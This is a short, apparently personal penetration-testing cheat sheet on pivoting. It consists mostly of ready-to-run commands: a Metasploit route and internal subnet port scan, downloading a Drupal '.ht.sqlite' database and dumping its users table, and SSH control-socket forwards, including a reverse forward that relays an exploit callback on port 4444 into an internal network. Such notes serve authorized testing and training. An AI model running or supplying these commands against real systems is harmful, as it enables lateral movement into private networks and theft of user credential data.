## Pivoting

## PortScan Through MSF pivot 
	route add 172.40.0.0 255.255.255.0 1 
	background
	use auxiliary/scanner/portscan/tcp
	set RHOSTS 172.40.0.0/24
	set PORTS 80,443,8000,8080
	
	use auxiliary/scanner/http/http_header
	set RHOSTS 172.40.0.10
	
	### Dump SQL Table
	download /var/www/html/sites/default/files/.ht.sqlite
	sqlite3 .ht.sqlite ".dump users_field_data"
### SSH
	ssh -MS /tmp/Initial mpoor@172.30.0.21
	for i in {1..254} ;do (ping -c 1 172.40.0.$i | grep "bytes from" &) ;done
	ssh -S /tmp/Initial -O forward -L 8080:172.40.0.10:80
	curl 127.0.0.1:8080
	ssh -S /tmp/Initial -O forward -R 0.0.0.0:8080:172.30.0.1:4444
	
	exploit through 172.40.0.1 8080 
	
### NetSH